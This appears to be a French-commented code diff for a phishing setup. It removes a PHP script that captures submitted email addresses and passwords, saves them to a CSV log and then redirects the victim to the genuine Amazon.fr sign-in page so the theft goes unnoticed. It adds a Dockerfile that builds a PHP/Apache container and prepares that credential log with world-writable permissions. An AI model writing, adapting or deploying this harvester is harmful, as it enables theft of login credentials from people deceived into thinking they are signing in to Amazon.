@@ -1,35 +1,59 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Récupérer les données soumises
-    $email = $_POST['email'];
-    $password = $_POST['password'];
+# FROM php:8.1-apache
 
-    // Nettoyer les données pour éviter les failles XSS
-    $email_clean = htmlspecialchars($email);
-    $password_clean = htmlspecialchars($password);
+# # Installer les dépendances
+# RUN apt-get update && apt-get install -y \
+#     libzip-dev \
+#     zip \
+#     unzip \
+#     && docker-php-ext-install pdo_mysql zip
 
-    // Spécifier le fichier CSV avec un chemin absolu
-    $file = '/var/log/log.csv';
+# # Activer mod_rewrite
+# RUN a2enmod rewrite
 
-    // Ouvrir le fichier CSV en mode ajout (append)
-    $handle = fopen($file, 'a');
+# # Créer le fichier log.csv et définir les permissions
+# RUN touch /var/www/html/log.csv && \
+#     chown www-data:www-data /var/www/html/log.csv && \
+#     chmod 666 /var/www/html/log.csv
 
-    // Vérifier si le fichier a bien été ouvert
-    if (!$handle) {
-        die('Impossible d\'ouvrir le fichier log.csv. Vérifiez les permissions.');
-    }
+# # Copier les fichiers de l'application
+# COPY . /var/www/html/
 
-    // Créer une ligne avec l'email et le mot de passe
-    $data = array($email_clean, $password_clean);
+# # Configurer les permissions
+# RUN chown -R www-data:www-data /var/www/html && \
+#     chmod -R 775 /var/www/html
 
-    // Écrire les données dans le fichier CSV
-    fputcsv($handle, $data);
+# # Exposer le port 80
+# EXPOSE 80
 
-    // Fermer le fichier
-    fclose($handle);
+# # Lancer Apache
+# CMD ["apache2-foreground"]
+# Utiliser l'image officielle de PHP avec Apache
+FROM php:8.1-apache
 
-    // Rediriger vers le site officiel d'Amazon
-    header("Location: https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2Fyour-account%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0");
-    exit();
-}
-?>
+# Installer les dépendances
+RUN apt-get update && apt-get install -y \
+    libzip-dev \
+    zip \
+    unzip \
+    && docker-php-ext-install pdo_mysql zip
+
+# Activer mod_rewrite pour Apache
+RUN a2enmod rewrite
+
+# Créer le fichier log.csv dans /var/log/ et définir les permissions
+RUN touch /var/log/log.csv && \
+    chown www-data:www-data /var/log/log.csv && \
+    chmod 666 /var/log/log.csv
+
+# Copier les fichiers de l'application dans /var/www/html/
+COPY . /var/www/html/
+
+# Configurer les permissions pour /var/www/html/
+RUN chown -R www-data:www-data /var/www/html && \
+    chmod -R 775 /var/www/html
+
+# Exposer le port 80
+EXPOSE 80
+
+# Lancer Apache au démarrage
+CMD ["apache2-foreground"]
